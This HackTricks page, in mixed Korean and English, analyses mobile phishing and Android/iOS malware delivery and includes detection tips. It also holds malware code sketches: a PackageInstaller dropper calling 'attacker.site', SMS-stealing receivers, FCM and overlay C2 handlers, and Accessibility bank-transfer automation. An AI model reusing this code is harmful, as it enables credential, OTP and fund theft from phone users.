# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지는 threat actors가 phishing(SEO, social engineering, fake stores, dating apps 등)을 통해 **malicious Android APKs**와 **iOS mobile-configuration profiles**를 배포하는 데 사용하는 techniques를 다룹니다.
> 이 내용은 Zimperium zLabs(2025)가 공개한 SarangTrap campaign과 기타 public research를 바탕으로 정리되었습니다.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* 수십 개의 look-alike domains(dating, cloud share, car service…)을 등록합니다.
– 로컬 언어 keywords와 이모지를 `<title>` element에 사용해 Google 순위를 올립니다.
– 같은 landing page에서 Android(`.apk`)와 iOS install instructions를 모두 호스팅합니다.
2. **First Stage Download**
* Android: unsigned 또는 “third-party store” APK로 직접 연결합니다.
* iOS: `itms-services://` 또는 malicious **mobileconfig** profile로 가는 plain HTTPS link를 사용합니다(아래 참조).
3. **Post-install Social Engineering**
* 첫 실행 시 앱이 **invitation / verification code**를 요구합니다(독점 접근처럼 보이게 함).
* 코드는 HTTP로 Command-and-Control (C2)에 **POST**됩니다.
* C2는 `{"success":true}`로 응답합니다 ➜ malware가 계속 진행됩니다.
* 유효한 code를 제출하지 않는 Sandbox / AV dynamic analysis는 **악성 행위가 전혀 보이지 않습니다**(evasion).
4. **Runtime Permission Abuse** (Android)
* 위험한 permissions는 **긍정적인 C2 응답 이후에만** 요청됩니다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 최근 변종은 `AndroidManifest.xml`에서 SMS 관련 `<uses-permission>`을 **제거**하지만, reflection을 통해 SMS를 읽는 Java/Kotlin code path는 남겨둡니다 ⇒ static score는 낮추면서도, `AppOps` abuse 또는 오래된 targets에서 permission을 허용한 device에서는 여전히 동작합니다.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13은 sideloaded apps에 대해 **Restricted settings**를 도입했습니다: 사용자가 **App info**에서 restricted settings를 명시적으로 허용하기 전까지 Accessibility와 Notification Listener 토글이 회색으로 비활성화됩니다.
* 이제 phishing pages와 droppers는 sideloaded app에 대해 **restricted settings를 허용**하고 그다음 Accessibility/Notification access를 활성화하는 단계별 UI instructions를 제공합니다.
* 더 새로운 bypass는 payload를 **session-based PackageInstaller flow**(app stores가 사용하는 동일한 방식)로 설치하는 것입니다. Android는 앱을 store-installed로 취급하므로 Restricted settings가 더 이상 Accessibility를 막지 않습니다.
* Triage hint: dropper에서 `PackageInstaller.createSession/openSession`와 함께 피해자를 즉시 `ACTION_ACCESSIBILITY_SETTINGS` 또는 `ACTION_NOTIFICATION_LISTENER_SETTINGS`로 이동시키는 code를 grep해 보세요.

6. **Facade UI & Background Collection**
* 앱은 로컬에서 구현된 harmless views(SMS viewer, gallery picker)를 보여줍니다.
* 동시에 다음을 exfiltrate 합니다:
- IMEI / IMSI, phone number
- 전체 `ContactsContract` dump(JSON array)
- [Luban](https://github.com/Curzibn/Luban)으로 크기를 줄인 `/sdcard/DCIM`의 JPEG/PNG
- 선택적 SMS content (`content://sms`)
Payload는 **batch-zipped**되어 `HTTP POST /upload.php`로 전송됩니다.
7. **iOS Delivery Technique**
* 하나의 **mobile-configuration profile**로 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등을 요청해 device를 “MDM”-like supervision에 등록할 수 있습니다.
* Social-engineering instructions:
1. Settings ➜ *Profile downloaded* 를 엽니다.
2. *Install*을 세 번 탭합니다(phishing page의 screenshots 참고).
3. 서명되지 않은 profile을 Trust하면 attacker가 App Store review 없이 *Contacts*와 *Photo* entitlement를 얻습니다.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload는 **phishing URL을 Home Screen에 고정**하고 branded icon/label을 표시할 수 있습니다.
* Web Clips는 **full-screen**으로 실행될 수 있고(browser UI를 숨김), **non-removable**로 표시될 수 있어, victim이 icon을 삭제하려면 profile 자체를 삭제해야 합니다.
9. **Network Layer**
* Plain HTTP를 사용하며, 보통 port 80에서 `api.<phishingdomain>.com` 같은 HOST header와 함께 동작합니다.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS 없음 → 쉽게 식별 가능).

## Red-Team Tips

* **Dynamic Analysis Bypass** – malware assessment 중 Frida/Objection으로 invitation code 단계를 자동화해 malicious branch까지 도달합니다.
* **Manifest vs. Runtime Diff** – `aapt dump permissions`와 runtime `PackageManager#getRequestedPermissions()`를 비교합니다; 보이지 않는 dangerous perms는 red flag입니다.
* **Network Canary** – `iptables -p tcp --dport 80 -j NFQUEUE`를 설정해 code 입력 후 발생하는 비정상적인 POST burst를 탐지합니다.
* **mobileconfig Inspection** – macOS에서 `security cms -D -i profile.mobileconfig`를 사용해 `PayloadContent`를 나열하고 과도한 entitlements를 찾습니다.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## 지표 (일반)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

이 패턴은 정부 혜택 테마를 악용해 인도 UPI credentials와 OTP를 탈취하는 캠페인에서 관찰되었습니다. 운영자들은 전달과 복원력을 위해 신뢰할 수 있는 플랫폼들을 연쇄적으로 사용합니다.

### 신뢰할 수 있는 플랫폼 전반의 전달 체인
- YouTube video lure → 설명에 short link 포함
- Shortlink → 합법 포털을 모방한 GitHub Pages phishing site
- 동일한 GitHub repo에 APK가 있으며, 파일로 직접 연결되는 가짜 “Google Play” 배지가 포함됨
- 동적 phishing pages는 Replit에서 동작함; 원격 command channel은 Firebase Cloud Messaging (FCM) 사용

### 내장 payload와 오프라인 설치를 가진 Dropper
- 첫 번째 APK는 실제 malware를 `assets/app.apk`에 담아 배포하는 installer (dropper)이며, cloud detection을 약화시키기 위해 사용자가 Wi‑Fi/mobile data를 끄도록 유도함.
- 내장된 payload는 무해한 이름(예: “Secure Update”)으로 설치됨. 설치 후 installer와 payload가 별도의 앱으로 함께 존재함.

Static triage tip (embedded payloads를 grep):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink를 통한 동적 endpoint discovery
- Malware는 shortlink에서 살아 있는 endpoint의 일반 텍스트, 쉼표로 구분된 목록을 가져오며, 간단한 문자열 변환으로 최종 phishing page path를 생성한다.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- The “Make payment of ₹1 / UPI‑Lite” step loads an attacker HTML form from the dynamic endpoint inside a WebView and captures sensitive fields (phone, bank, UPI PIN) which are `POST`ed to `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### 자체 전파 및 SMS/OTP 가로채기
- 첫 실행 시 공격적인 권한이 요청됨:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 연락처는 피해자 기기에서 대량 smishing SMS를 보내도록 반복 사용된다.
- 수신 SMS는 broadcast receiver에 의해 가로채져, metadata(발신자, 본문, SIM slot, per-device random ID)와 함께 `/addsm.php`로 업로드된다.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- 페이로드는 FCM에 등록되며; push 메시지는 `_type` 필드를 전달하고, 이 필드는 동작을 트리거하는 스위치로 사용된다(예: 피싱 텍스트 템플릿 업데이트, 동작 전환).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 스케치:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

왜 간단한 controls를 evasion하는가:
- 정적 APK URL이 노출되지 않음; payload는 WebSocket frames에서 메모리 내에서 재구성됨.
- 직접 .apk 응답을 차단하는 URL/MIME/extension filters는 WebSockets/Socket.IO를 통해 터널링된 binary data를 놓칠 수 있음.
- WebSockets를 실행하지 않는 crawlers와 URL sandboxes는 payload를 가져오지 못함.

WebSocket tradecraft와 tooling도 참고:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT campaign (ThreatFabric)은 현대 mobile phishing operations가 WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, 그리고 NFC-relay orchestration까지 결합하는 구체적인 예시다. 이 섹션은 재사용 가능한 techniques를 추상화한다.

### Stage-1: WebView → native install bridge (dropper)
Attackers는 attacker page를 가리키는 WebView를 제시하고 native installer를 노출하는 JavaScript interface를 주입한다. HTML button을 탭하면 dropper의 assets에 포함된 second-stage APK를 설치한 뒤 직접 실행하는 native code를 호출한다.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

페이지의 HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
설치 후, dropper는 명시적인 package/activity를 통해 payload를 시작합니다:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.

- Accessibility programmatically helps accept later prompts by finding buttons like “Allow”/“OK” in the node-tree and dispatching clicks.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView를 통한 Overlay phishing/ransom
Operators는 다음 명령을 내릴 수 있다:
- URL에서 전체 화면 overlay를 렌더링하거나,
- WebView overlay에 로드되는 inline HTML을 전달한다.

가능한 용도: coercion (PIN 입력), PIN을 탈취하기 위한 wallet 열기, ransom 메시지. overlay permission이 없으면 부여되도록 보장하는 command를 유지한다.

### 원격 제어 모델 – text pseudo-screen + screen-cast
- 저대역폭: 주기적으로 Accessibility node tree를 덤프하고, 보이는 texts/roles/bounds를 serialize해서 pseudo-screen으로 C2에 전송한다(`txt_screen` 같은 command를 한 번, `screen_live`를 연속으로 사용).
- 고충실도: MediaProjection을 요청하고 필요 시 screen-casting/recording을 시작한다(`display` / `record` 같은 command).

### ATS playbook (bank app automation)
JSON task가 주어지면 bank app을 열고, text queries와 coordinate taps를 섞어 Accessibility를 통해 UI를 조작한 뒤, 안내가 뜨면 피해자의 payment PIN을 입력한다.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
예시 텍스트는 하나의 대상 흐름에서 볼 수 있음 (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- 현재 credential을 만료시켜 변경을 강제하기 (Accessibility가 새로운 PIN/password를 캡처함):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- 키가드 biometric 기능을 비활성화하여 non-biometric unlock 강제:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: 최근 Android에서는 많은 `DevicePolicyManager` 제어가 `Device Owner`/`Profile Owner`를 요구합니다. 일부 OEM 빌드는 느슨할 수 있습니다. 항상 대상 OS/OEM에서 검증하세요.

### NFC relay orchestration (NFSkate)
Stage-3는 외부 NFC-relay 모듈(예: NFSkate)을 설치하고 실행할 수 있으며, relay 동안 피해자를 안내하기 위해 HTML template까지 넘겨줄 수 있습니다. 이를 통해 online ATS와 함께 contactless card-present cash-out도 가능해집니다.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors는 점점 더 Accessibility-driven automation을 basic behaviour biometrics에 맞춘 anti-detection과 결합하고 있습니다. 최근의 banker/RAT는 두 가지 상호 보완적인 text-delivery mode와, 무작위 cadence로 human typing을 시뮬레이션하는 operator toggle을 보여줍니다.

- Discovery mode: 동작하기 전에 selectors와 bounds를 사용해 보이는 노드를 열거하여 입력 필드(ID, text, contentDescription, hint, bounds)를 정확히 타겟팅합니다.
- Dual text injection:
- Mode 1 – 대상 노드에 직접 `ACTION_SET_TEXT` 적용(안정적, keyboard 없음);
- Mode 2 – clipboard 설정 + 포커스된 노드에 `ACTION_PASTE`(직접 setText가 차단될 때 작동).
- Human-like cadence: operator가 제공한 string을 분할하고, “machine-speed typing” heuristic을 피하기 위해 이벤트 사이에 300–3000 ms의 무작위 delay를 두고 문자 단위로 전달합니다. 이는 `ACTION_SET_TEXT`로 값을 점진적으로 늘리거나, 한 번에 한 글자씩 붙여넣는 방식으로 구현됩니다.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

사기 방지를 위한 차단 오버레이:
- 운영자가 제어하는 불투명도로 전체 화면 `TYPE_ACCESSIBILITY_OVERLAY`를 렌더링하고, 원격 자동화가 그 아래에서 진행되는 동안 피해자에게는 불투명하게 유지한다.
- 일반적으로 노출되는 명령: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

조절 가능한 alpha를 가진 최소 오버레이:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## WebView bridge, JNI 문자열 디코더, 그리고 단계적 DEX 로딩이 있는 다단계 Android 드로퍼

CERT Polska의 03 April 2026 분석인 **cifrat**는, 보이는 APK가 단지 installer shell일 뿐인 현대적인 phishing-delivered Android loader의 좋은 참고 자료입니다. 재사용 가능한 tradecraft는 family name이 아니라, stage가 연결되는 방식입니다:

1. Phishing page가 lure APK를 전달합니다.
2. Stage 0는 `REQUEST_INSTALL_PACKAGES`를 요청하고, native `.so`를 로드한 뒤, 내장된 blob을 decrypt하고, **PackageInstaller sessions**로 stage 2를 설치합니다.
3. Stage 2는 또 다른 숨겨진 asset을 decrypt한 다음 이를 ZIP처럼 취급하고, 최종 RAT를 위해 **dynamically loads DEX** 합니다.
4. 최종 stage는 Accessibility/MediaProjection을 악용하고, control/data에 WebSockets를 사용합니다.

### 설치 컨트롤러로서의 WebView JavaScript bridge

WebView를 단순히 fake branding에만 쓰는 대신, lure는 로컬/원격 page가 device를 fingerprint하고 native install logic을 트리거할 수 있는 bridge를 노출할 수 있습니다:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage ideas:
- `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` 및 같은 activity에서 사용되는 remote phishing URLs를 grep
- `start`, `install`, `openAccessibility`, `requestOverlay` 같은 installer-like methods를 노출하는 bridges를 주의해서 봐야 함
- bridge가 phishing page에 의해 구동된다면, 단순한 UI가 아니라 operator/controller surface로 취급

### `JNI_OnLoad`에 등록된 Native string decoding

유용한 패턴 하나는 겉보기에는 harmless해 보이지만, 실제로는 `JNI_OnLoad` 동안 `RegisterNatives`에 의해 백킹되는 Java method이다. cifrat에서 decoder는 첫 번째 char를 무시하고, 두 번째를 1-byte XOR key로 사용했으며, 나머지를 hex-decode하고, 각 byte를 `((b - i) & 0xff) ^ key`로 변환했다.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Use this when you see:
- URLs, package names, 또는 keys에 대해 하나의 native-backed Java method가 반복 호출되는 경우
- `JNI_OnLoad`가 classes를 resolve하고 `RegisterNatives`를 호출하는 경우
- DEX에는 의미 있는 plaintext strings가 거의 없지만, 하나의 helper에 전달되는 짧은 hex-looking constants가 많은 경우

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

이 family는 일반적으로 탐지할 가치가 있는 두 개의 unpacking layers를 사용했다:

- **Stage 0**: native decoder를 통해 유도된 XOR key로 `res/raw/*.bin`을 decrypt한 다음, `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`를 통해 plaintext APK를 install
- **Stage 2**: `FH.svg` 같은 무해해 보이는 asset을 extract하고, RC4-like routine으로 decrypt한 뒤, 결과를 ZIP으로 parse한 다음 hidden DEX files를 load

이는 각 layer가 다음 stage를 basic static scanning으로부터 opaque하게 유지하기 때문에, 실제 dropper/loader pipeline의 강한 indicator이다.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES`와 `PackageInstaller` session calls
- install 후 chain을 계속하기 위한 `PACKAGE_ADDED` / `PACKAGE_REPLACED` receivers
- non-media extensions를 가진 `res/raw/` 또는 `assets/` 아래의 encrypted blobs
- custom decryptors 근처의 `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling

### Native anti-debugging through `/proc/self/maps`

native bootstrap은 또한 `/proc/self/maps`를 `libjdwp.so`에 대해 scan했고, 존재하면 abort했다. 이는 JDWP-backed debugging이 알아볼 수 있는 mapped library를 남기기 때문에 실용적인 early anti-analysis check이다:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Hunting ideas:
- `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`에 대해 native code / decompiler output을 grep
- Frida hooks가 너무 늦게 도착하면, 먼저 `.init_array`와 `JNI_OnLoad`를 확인
- anti-debug + string decoder + staged install을 독립적인 발견이 아니라 하나의 클러스터로 취급

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
